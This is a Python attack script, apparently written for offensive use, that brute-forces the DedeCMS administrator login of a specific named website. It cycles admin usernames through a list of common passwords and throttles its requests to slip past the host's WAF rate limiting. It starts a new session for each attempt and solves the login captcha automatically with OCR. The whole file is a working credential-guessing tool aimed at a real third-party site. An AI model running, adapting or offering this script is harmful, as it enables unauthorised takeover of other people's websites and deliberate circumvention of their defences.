#!/usr/bin/env python3
"""bf_dede_slow.py - chinaglass.club DedeCMS慢速爆破 (绕西部数码WAF限频)
每5秒1次, 每次新session, 验证码OCR
"""
import urllib.request, urllib.parse, ssl, re, http.cookiejar, sys, time, io
import ddddocr
from PIL import Image

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BASE = 'http://chinaglass.club'

# 重点密码(慢速所以精选)
PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "admin@123",
             "123456a", "a123456", "666666", "888888", "000000", "admin666",
             "123123", "111111", "654321", "admin2023", "admin2024", "Admin123",
             "123qwe", "zxcvbnm", "admin12345", "dedecms", "chinaglass",
             "admin!@#", "123456789", "1qaz2wsx", "qwe123", "abc123",
             "adminadmin", "password", "qwer1234"]

def get_captcha(opener):
    for _ in range(3):
        try:
            r = opener.open(urllib.request.Request(BASE + '/include/vdimgck.php', headers=UA), timeout=10)
            img = r.read()
            if img[:2] != b'\xff\xd8':
                continue
            im = Image.open(io.BytesIO(img)).convert('L')
            im = im.resize((im.width * 3, im.height * 3), Image.LANCZOS)
            im = im.point(lambda p: 255 if p > 130 else 0)
            buf = io.BytesIO(); im.save(buf, 'PNG')
            ocr = ddddocr.DdddOcr(show_ad=False)
            ocrb = ddddocr.DdddOcr(show_ad=False, beta=True)
            c1 = ocr.classification(img)
            c2 = ocrb.classification(buf.getvalue())
            return c1 if c1 == c2 else (c2 if len(c2) == 4 else c1)
        except Exception:
            time.sleep(2)
    return None

def main():
    for user in ["admin", "root", "administrator"]:
        for pw in PASSWORDS:
            cj = http.cookiejar.CookieJar()
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj),
                                                 urllib.request.HTTPSHandler(context=ctx))
            try:
                opener.open(urllib.request.Request(BASE + '/admin/login.php', headers=UA), timeout=10).read()
            except Exception:
                pass
            code = get_captcha(opener)
            if not code:
                print('captcha fail, wait', flush=True)
                time.sleep(12)
                continue
            data = urllib.parse.urlencode({'gotopage': '/admin/', 'dopost': 'login', 'adminstyle': 'newdedecms',
                                           'userid': user, 'pwd': pw, 'validate': code}).encode()
            try:
                req = urllib.request.Request(BASE + '/admin/login.php', data=data,
                                             headers={**UA, 'Content-Type': 'application/x-www-form-urlencoded',
                                                      'Referer': BASE + '/admin/login.php'})
                resp = opener.open(req, timeout=10)
                b = resp.read(8000).decode('gbk', 'ignore')
                fu = resp.geturl()
                st = resp.status
            except urllib.error.HTTPError as e:
                st, b, fu = e.code, e.read(8000).decode('gbk', 'ignore'), e.geturl()
            except Exception as e:
                print('err %s' % repr(e)[:60], flush=True)
                time.sleep(12)
                continue
            # WAF拦截
            if 'stopinfo' in fu or 'vhostgo' in fu:
                print('%s/%s: WAF (sleep 30)' % (user, pw), flush=True)
                time.sleep(45)
                continue
            # 验证码错
            if '楠岃瘉鐮佷笉姝' in b:
                print('%s/%s: captcha wrong' % (user, pw), flush=True)
                continue
            # 密码错
            if '閿欒' in b or '错误' in b or '不存在' in b or '瀵嗙爜' in b:
                print('%s/%s: pw wrong' % (user, pw), flush=True)
                time.sleep(8)
                continue
            # 其他=可能成功
            if st == 302 and 'login' not in fu.lower():
                print('!!! HIT: %s/%s -> %s' % (user, pw, fu), flush=True)
                sys.exit(0)
            cns = re.findall(r'[\u4e00-\u9fff]{4,}', b)
            print('!!! CHECK %s/%s st=%d fu=%s CN=%s' % (user, pw, st, fu, cns[:5]), flush=True)
            sys.exit(0)
    print('=== NO HIT ===')

if __name__ == '__main__':
    main()
